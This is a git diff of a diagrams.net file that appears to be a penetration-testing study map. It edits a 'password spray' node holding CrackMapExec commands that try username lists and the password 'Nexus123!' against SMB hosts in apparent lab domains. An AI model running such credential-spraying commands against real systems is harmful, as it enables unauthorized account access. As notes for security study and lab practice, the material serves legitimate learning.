@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2024-03-20T13:59:05.548Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" etag="FhuBaE-Nn-xqOznA_6xk" version="24.0.1" type="github" pages="8">
+<mxfile host="app.diagrams.net" modified="2024-03-20T14:00:37.345Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" etag="lsJIY8k3ihlI7LWsMHQy" version="24.0.1" type="github" pages="8">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="793" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -506,7 +506,7 @@
         <mxCell id="46VSiSrXyTr81zkC9bUa-1" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.25;entryDx=0;entryDy=0;" parent="1" source="Mgc068LGqz-ZIUhQZxpC-4" target="Iw_T4d_-wb4pz08Lo9XD-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="password spray" cmd="cme smb 172.16.248.10 -u users_parsed.txt -p users_parsed.txt --no-bruteforce --continue-on-success" cmd2="cme smb 192.168.50.75 -u users.txt -p &#39;Nexus123!&#39; -d corp.com --continue-on-success" id="Mgc068LGqz-ZIUhQZxpC-4">
+        <object label="password spray" cmd="cme smb 172.16.248.10 -u users_parsed.txt -p users_parsed.txt -d medtech.com --no-bruteforce --continue-on-success" cmd2="cme smb 192.168.50.75 -u users.txt -p &#39;Nexus123!&#39; -d corp.com --continue-on-success" id="Mgc068LGqz-ZIUhQZxpC-4">
           <mxCell style="whiteSpace=wrap;html=1;rounded=1;fontSize=14;strokeColor=#e5a50a;" parent="1" vertex="1">
             <mxGeometry y="505" width="140" height="70" as="geometry" />
           </mxCell>
